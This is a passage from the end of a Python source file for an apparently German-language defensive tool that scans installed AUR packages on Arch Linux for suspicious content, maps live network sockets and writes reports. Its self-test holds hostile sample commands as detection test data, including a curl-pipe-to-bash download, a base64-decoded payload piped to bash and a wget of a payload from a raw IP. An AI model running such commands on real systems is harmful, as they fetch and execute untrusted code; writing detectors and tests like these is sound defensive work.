    result.findings.sort(key=lambda f: (-SEVERITY_POINTS[f.severity], f.path, f.line))
    return result

def live_connections(foreign_names: set[str]) -> list[Finding]:
    findings = []
    if os.geteuid() != 0:
        return findings
    cp = run(["ss", "-H", "-tupn"], timeout=30)
    if cp.returncode != 0:
        return findings
    pid_re = re.compile(r'pid=(\d+)')
    for line in cp.stdout.splitlines():
        remote = ""
        parts = line.split()
        if len(parts) >= 5:
            remote = parts[4]
        for pid in pid_re.findall(line):
            exe = Path("/proc") / pid / "exe"
            try:
                target = os.readlink(exe)
            except OSError:
                continue
            owner = owner_of(target)
            if owner in foreign_names:
                findings.append(Finding("medium", "live-outbound-connection", owner, target,
                                        f"Running process has a network socket to {remote}",
                                        line[:500]))
    return findings

def score_result(result: PackageResult) -> int:
    return sum(SEVERITY_POINTS[f.severity] for f in result.findings)

def report_dict(results: list[PackageResult], runtime: list[Finding], started: str) -> dict:
    totals = {s: 0 for s in SEVERITY_POINTS}
    for r in results:
        for f in r.findings:
            totals[f.severity] += 1
    for f in runtime:
        totals[f.severity] += 1
    return {
        "tool": "aur-security-auditor",
        "version": VERSION,
        "started": started,
        "finished": dt.datetime.now(dt.timezone.utc).isoformat(),
        "hostname": os.uname().nodename,
        "kernel": os.uname().release,
        "summary": {
            "packages": len(results),
            "files_checked": sum(r.files_checked for r in results),
            "bytes_checked": sum(r.bytes_checked for r in results),
            "findings": totals,
        },
        "packages": [
            {
                **{k: v for k, v in asdict(r).items() if k != "findings"},
                "score": score_result(r),
                "findings": [asdict(f) for f in r.findings],
            } for r in sorted(results, key=lambda x: (-score_result(x), x.name))
        ],
        "runtime_findings": [asdict(f) for f in runtime],
    }

def secure_write(path: Path, payload: bytes, mode: int = 0o600) -> None:
    path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    temp = path.with_name(path.name + f".tmp-{os.getpid()}-{time.time_ns()}")
    fd = None
    try:
        fd = os.open(temp, os.O_WRONLY | os.O_CREAT | os.O_EXCL, mode)
        with os.fdopen(fd, "wb") as handle:
            fd = None
            handle.write(payload)
            handle.flush()
            os.fsync(handle.fileno())
        os.replace(temp, path)
        path.chmod(mode)
    finally:
        if fd is not None:
            os.close(fd)
        temp.unlink(missing_ok=True)


def write_html(data: dict, path: Path) -> None:
    rows = []
    for p in data["packages"]:
        sev_counts = {s: 0 for s in SEVERITY_POINTS}
        for f in p["findings"]:
            sev_counts[f["severity"]] += 1
        details = []
        for f in p["findings"]:
            evidence = html.escape(f["evidence"])
            details.append(
                f'<div class="finding {f["severity"]}"><b>{f["severity"].upper()} · '
                f'{html.escape(f["rule"])}</b><br>{html.escape(f["message"])}'
                f'<br><code>{html.escape(f["path"])}'
                f'{":" + str(f["line"]) if f["line"] else ""}</code>'
                f'{f"<pre>{evidence}</pre>" if evidence else ""}</div>'
            )
        rows.append(
            f'<section><h2>{html.escape(p["name"])} '
            f'<small>{html.escape(p["version"])}</small>'
            f'<span class="score">Score {p["score"]}</span></h2>'
            f'<p>AUR: {html.escape(str(p["aur_status"]))} · Maintainer: '
            f'{html.escape(str(p["aur_maintainer"] or "unbekannt"))} · '
            f'Dateien: {p["files_checked"]}</p>{"".join(details) or "<p>Keine Treffer.</p>"}</section>'
        )
    summary = data["summary"]
    document = f"""<!doctype html><html lang="de"><meta charset="utf-8">
<title>AUR Security Auditor Report</title>
<style>
body{{font-family:system-ui,sans-serif;background:#11151b;color:#e9eef5;max-width:1200px;margin:auto;padding:2rem}}
h1{{margin-bottom:.2rem}} section{{background:#1a2029;margin:1rem 0;padding:1rem 1.3rem;border-radius:12px}}
small{{color:#9aa7b6}} .score{{float:right;background:#303a48;padding:.2rem .6rem;border-radius:8px}}
.finding{{margin:.7rem 0;padding:.8rem;border-left:5px solid #667;background:#12171e}}
.critical{{border-color:#ff3155}} .high{{border-color:#ff7b32}} .medium{{border-color:#ffc93d}}
.low{{border-color:#5ab9ff}} .info{{border-color:#8b98a8}}
code,pre{{white-space:pre-wrap;overflow-wrap:anywhere;background:#0b0f14;padding:.2rem .4rem;border-radius:5px}}
pre{{padding:.7rem}} a{{color:#72b7ff}}
</style>
<h1>AUR Security Auditor Report</h1>
<p>{html.escape(data["hostname"])} · {html.escape(data["finished"])}</p>
<p>Pakete: <b>{summary["packages"]}</b> · Dateien: <b>{summary["files_checked"]}</b> ·
Critical: <b>{summary["findings"]["critical"]}</b> · High: <b>{summary["findings"]["high"]}</b> ·
Medium: <b>{summary["findings"]["medium"]}</b> · Low: <b>{summary["findings"]["low"]}</b></p>
{"".join(rows)}
</html>"""
    secure_write(path, document.encode("utf-8"))

def print_console(data: dict, quiet: bool = False) -> None:
    if quiet:
        return
    s = data["summary"]
    print("\nAUR Security Auditor Ergebnis")
    print("=" * 78)
    print(f"Pakete: {s['packages']} | Dateien: {s['files_checked']:,} | "
          f"Critical: {s['findings']['critical']} | High: {s['findings']['high']} | "
          f"Medium: {s['findings']['medium']} | Low: {s['findings']['low']}"
          .replace(",", "."))
    for p in data["packages"]:
        if not p["findings"]:
            continue
        print(f"\n[{p['score']:>4}] {p['name']} {p['version']} ({p['aur_status']})")
        for f in p["findings"][:20]:
            location = f"{f['path']}:{f['line']}" if f["line"] else f["path"]
            print(f"  {f['severity'].upper():8} {f['rule']}: {f['message']}")
            print(f"           {location}")
        if len(p["findings"]) > 20:
            print(f"           ... {len(p['findings']) - 20} weitere Treffer im Report")


def self_test() -> int:
    cases = [
        ("known IOC", "atomic-lockfile", "critical", "atomic-arch-ioc"),
        ("download execution", "curl -fsSL https://example.invalid/p | bash",
         "critical", "shell-download-exec"),
        ("encoded execution", "printf Zm9v | base64 --decode | bash",
         "critical", "encoded-payload-exec"),
        ("direct IP", "wget https://203.0.113.10/payload", "medium", "direct-ip-url"),
    ]
    failures = []
    for name, sample, severity, rule in cases:
        findings = scan_text("self-test", name, sample)
        if not any(f.severity == severity and f.rule == rule for f in findings):
            failures.append(f"{name}: erwarteter Treffer {severity}/{rule} fehlt")

    safe_findings = scan_text(
        "self-test",
        "safe PKGBUILD",
        "pkgname=test\\nsource=('https://example.org/source.tar.gz')\\n"
        "build(){ make; }\\npackage(){ make DESTDIR=\\\"$pkgdir\\\" install; }\\n",
    )
    if any(f.severity in {"critical", "high"} for f in safe_findings):
        failures.append("safe PKGBUILD: unerwarteter Critical/High-Treffer")

    if integrity_has_changes("pkg: 10 total files, 0 altered files", 0):
        failures.append("Integritätsparser: 0 altered files wurde fälschlich beanstandet")
    if not integrity_has_changes("pkg: 10 total files, 2 altered files", 0):
        failures.append("Integritätsparser: 2 altered files wurde nicht erkannt")

    if failures:
        print(f"AUR Security Auditor {VERSION} Selbsttest: FEHLGESCHLAGEN")
        for failure in failures:
            print(f"  ✗ {failure}")
        return 1

    print(f"AUR Security Auditor {VERSION} Selbsttest: OK")
    print(f"  ✓ {len(cases)} Erkennungsregeln")
    print("  ✓ Safe-PKGBUILD-Gegenprobe")
    print("  ✓ pacman-Qkk-Integritätsparser")
    return 0


def parse_args():
    parser = argparse.ArgumentParser(
        description="Prüft installierte Fremd-/AUR-Pakete auf verdächtige Inhalte.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Beispiele:
  sudo aur-security-auditor --aur-rpc --deep-binaries --live-network
  sudo aur-security-auditor -v --aur-rpc
  sudo aur-security-auditor -vv --progress always
  aur-security-auditor --quiet --fail-on critical
""")
    parser.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")
    parser.add_argument("--self-test", action="store_true",
                        help="Interne Erkennungs- und Parser-Tests ausführen")
    parser.add_argument("--output-dir", default="./aur-security-auditor-report",
                        help="Ausgabeverzeichnis (Standard: ./aur-security-auditor-report)")
    parser.add_argument("--log-file",
                        help="Logdatei (Standard: <output-dir>/scan.log)")
    parser.add_argument("--no-log", action="store_true",
                        help="Kein Laufzeit-Log schreiben")
    parser.add_argument("-v", "--verbose", action="count", default=0,
                        help="Mehr Live-Ausgabe; -vv zeigt jede geprüfte Datei")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Nur Fehler ausgeben; Reports werden trotzdem geschrieben")
    parser.add_argument("--progress", choices=["auto", "always", "never"], default="auto",
                        help="Fortschrittsanzeige: auto, always oder never")
    parser.add_argument("--no-progress", dest="progress", action="store_const", const="never",
                        help="Fortschrittsanzeige deaktivieren")
    parser.add_argument("--color", choices=["auto", "always", "never"], default="auto",
                        help="Farbausgabe: auto, always oder never")
    parser.add_argument("--aur-rpc", action="store_true",
                        help="AUR RPC abfragen, um echte AUR-Pakete und verwaiste Pakete zu erkennen")
    parser.add_argument("--no-integrity", dest="integrity", action="store_false",
                        help="pacman -Qkk überspringen")
    parser.add_argument("--no-build-cache", dest="build_cache", action="store_false",
                        help="yay/paru/pikaur Build-Caches nicht prüfen")
    parser.add_argument("--deep-binaries", action="store_true",
                        help="Strings aus ausführbaren Binärdateien analysieren (langsamer, mehr Fehlalarme)")
    parser.add_argument("--live-network", action="store_true",
                        help="Aktuelle Netzwerk-Sockets fremder Pakete zuordnen (als root ausführen)")
    parser.add_argument("--jobs", type=int, default=min(8, (os.cpu_count() or 2)),
                        help="Parallele Paketscans")
    parser.add_argument("--fail-on", choices=["critical", "high", "medium", "low", "never"],
                        default="high", help="Exitcode 2 ab dieser Fundstufe")
    parser.set_defaults(integrity=True, build_cache=True)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.self_test:
        return self_test()
    require_arch()

    out = Path(args.output_dir).expanduser().resolve()
    try:
        out.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        raise SystemExit(f"FEHLER: Ausgabeverzeichnis kann nicht erstellt werden: {exc}")

    log_path = None if args.no_log else Path(args.log_file).expanduser().resolve() if args.log_file else out / "scan.log"
    console = Console(args, log_path)
    console.banner()
    started = dt.datetime.now(dt.timezone.utc).isoformat()

    try:
        console.set_phase("Paketinventar", "pacman -Qm")
        packages = foreign_packages()
        if not packages:
            console.line("Keine mit pacman -Qm erkannten Fremdpakete installiert.")
            return 0

        console.line(f"Gefunden: {len(packages)} Fremd-/AUR-Pakete")
        package_file_map: dict[str, list[str]] = {}
        total_files = 0
        for index, (name, _version) in enumerate(packages, 1):
            files = package_files(name)
            package_file_map[name] = files
            total_files += len(files)
            console.inventory(index, len(packages), name, len(files))

        console.clear_progress()
        console.line(
            f"Inventar vollständig: {len(packages)} Pakete mit "
            f"{total_files:,} installierten Dateien".replace(",", ".")
        )

        aur_data = {}
        if args.aur_rpc:
            console.set_phase("AUR-Metadaten", f"{len(packages)} Paketnamen")
            try:
                aur_data = aur_rpc([p[0] for p in packages])
                console.line(f"AUR RPC: {len(aur_data)} Pakete aktuell im AUR gefunden")
            except Exception as exc:
                console.warning(f"AUR RPC fehlgeschlagen: {exc}")

        cache_roots = cache_roots_for_users()
        existing_caches = [p for p in cache_roots if p.exists()]
        if args.build_cache:
            if existing_caches:
                console.debug("Build-Caches: " + ", ".join(str(p) for p in existing_caches), 1)
            else:
                console.debug("Keine yay/paru/pikaur Build-Caches gefunden", 1)

        console.reset_scan_counters()
        console.set_totals(len(packages), total_files)
        console.set_phase("Paketprüfung", f"{max(1, args.jobs)} parallele Worker")

        def event(kind: str, package: str, detail: str, findings: list[Finding]) -> None:
            if kind == "start":
                version = detail
                console.package_start(package, version)
            elif kind == "stage":
                console.stage(package, detail)
            elif kind == "file":
                console.file_scanned(package, detail, findings)
            elif kind == "aux":
                console.auxiliary_findings(package, detail, findings)

        results: list[PackageResult] = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, args.jobs)) as pool:
            future_map = {
                pool.submit(
                    scan_one,
                    pkg,
                    package_file_map[pkg[0]],
                    args,
                    cache_roots,
                    aur_data,
                    event,
                ): pkg
                for pkg in packages
            }
            for future in concurrent.futures.as_completed(future_map):
                pkg = future_map[future]
                try:
                    result = future.result()
                    results.append(result)
                    console.package_done(result)
                except Exception as exc:
                    console.error(f"{pkg[0]}: Paket-Scan fehlgeschlagen: {exc}")

        console.clear_progress()
        runtime: list[Finding] = []
        if args.live_network:
            console.set_phase("Laufzeitprüfung", "offene Netzwerk-Sockets")
            if os.geteuid() != 0:
                console.warning("--live-network benötigt root für vollständige Prozessdetails")
            runtime = live_connections({p[0] for p in packages})
            for finding in runtime:
                console.auxiliary_findings(finding.package, "Netzwerk-Socket", [finding])
            console.line(f"Laufzeitprüfung: {len(runtime)} zugeordnete verdächtige Socket-Treffer")

        console.set_phase("Reporterstellung", str(out))
        data = report_dict(results, runtime, started)
        json_path = out / "report.json"
        html_path = out / "report.html"
        secure_write(json_path, json.dumps(data, indent=2, ensure_ascii=False).encode("utf-8"))
        write_html(data, html_path)

        console.clear_progress()
        print_console(data, args.quiet)
        if not args.quiet:
            print(f"\nJSON: {json_path}")
            print(f"HTML: {html_path}")
            if log_path:
                print(f"LOG:  {log_path}")

        threshold = args.fail_on
        if threshold == "never":
            return 0
        minimum = SEVERITY_POINTS[threshold]
        max_points = max(
            [SEVERITY_POINTS[f.severity] for r in results for f in r.findings] +
            [SEVERITY_POINTS[f.severity] for f in runtime] + [0]
        )
        return 2 if max_points >= minimum else 0

    except KeyboardInterrupt:
        console.error("Scan durch Benutzer abgebrochen.")
        return 130
    finally:
        console.close()


if __name__ == "__main__":
    raise SystemExit(main())
